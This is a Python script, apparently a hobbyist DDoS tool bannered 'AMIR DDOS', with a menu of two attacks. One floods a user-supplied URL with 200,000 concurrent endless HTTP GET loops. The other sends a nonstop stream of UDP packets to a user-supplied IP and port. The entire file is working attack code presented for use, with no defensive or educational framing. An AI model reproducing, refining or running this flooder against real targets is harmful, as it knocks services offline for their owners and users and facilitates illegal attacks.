import aiohttp
import asyncio
import sys
import colorama 
from colorama import Fore
import os 
from pystyle import *
import socket

colorama.init(convert=True, autoreset=True)


os.system('cls') if os.name == 'nt' else os.system('clear')
print(f"""

{Fore.RED}░█████╗░███╗░░░███╗██╗██████╗░  ██████╗░██████╗░░█████╗░░██████╗
{Fore.RED}██╔══██╗████╗░████║██║██╔══██╗  ██╔══██╗██╔══██╗██╔══██╗██╔════╝
{Fore.RED}███████║██╔████╔██║██║██████╔╝  ██║░░██║██║░░██║██║░░██║╚█████╗░
{Fore.RED}██╔══██║██║╚██╔╝██║██║██╔══██╗  ██║░░██║██║░░██║██║░░██║░╚═══██╗
{Fore.RED}██║░░██║██║░╚═╝░██║██║██║░░██║  ██████╔╝██████╔╝╚█████╔╝██████╔╝
{Fore.RED}╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝╚═╝░░╚═╝  ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
{Fore.RESET}                                                                                 

""")
webhook = ""
print(f"{Fore.RED} [1] DDoS{Fore.RESET}")
print(f"{Fore.RED} [2] IP Bomb{Fore.RESET}")
choice = input('==> ')

packets = 0
fetches = 0
url = ""

def send_packet(ipa, port):
    global packets
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto('Cyber DoS'.encode('utf-8'), (ipa, port))

    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        s.close()
def ipbomb(ip, port):
    global packets
    os.system('cls') if os.name == 'nt' else os.system('clear')
    while True:
        send_packet(ip, port)
        packets += 1
        sys.stdout.write(f'Packets sent: {packets} | Ip: {ip}, Port: {port}')
        
async def flood(session, url):
    global fetches
    while True:
        try:
            async with session.get(url) as response:
                fetches += 1
                sys.stdout.write(f"Status: {response.status} | Requests: [{fetches}]\r")
        except Exception as e:
            sys.stdout.write(f"Error: {e}\r")

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [flood(session, url) for _ in range(200000)] 
        await asyncio.gather(*tasks)
        
if choice not in ['1', '2']:
    print(f"{Fore.RED}Invalid choice. Please select either 1 or 2.{Fore.RESET}")
    sys.exit(1)
    
if int(choice) == 1:
    url = str(input('Target URL >> '))
    asyncio.run(main())
elif int(choice) == 2:
    ip = str(input('Target IP >> '))
    port = int(input('Port >> '))
    ipbomb(ip, port)
